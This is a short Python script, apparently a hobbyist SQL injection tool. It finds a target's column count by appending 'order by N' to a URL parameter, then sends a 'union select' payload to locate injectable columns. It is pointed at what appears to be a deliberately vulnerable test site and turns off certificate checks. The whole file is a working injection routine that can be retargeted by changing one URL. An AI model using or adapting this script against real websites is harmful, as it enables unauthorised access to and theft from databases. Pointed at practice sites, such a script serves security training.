import requests
from pprint import pprint
__author__ = "jfc_me"
pprint(__author__)


class Teste:

    def get_conec(self, url):
        end = requests.get(url, verify=False, timeout=10)
        return end

    def quantidadeColuna(self, url):
        for quantidade_coluna in range(1, 100):
            sintaxe = "order by"
            conj = "{} {} {}".format(url, sintaxe, quantidade_coluna)
            ad = "'{}'".format(quantidade_coluna)
            aprox = (quantidade_coluna - 1)
            dect = Teste().get_conec(conj)
            if ad in dect.text or 'Warning' in dect.text:
                return aprox
            else:
                print("[ Test ] ", conj)

    def colunasVulneraveis(self, end):
        payload = " union select"
        num = Teste().quantidadeColuna(end)
        coluna = [i for i in range(1, num + 1)]
        adc = '{} {} {} '
        ad = adc.format(end, payload, str(coluna).replace("[", '').replace("]", ''))
        Teste().get_conec(ad)
        print("[ INJECT ] ", ad)



Teste().colunasVulneraveis("http://testphp.vulnweb.com/artists.php?artist=-1")

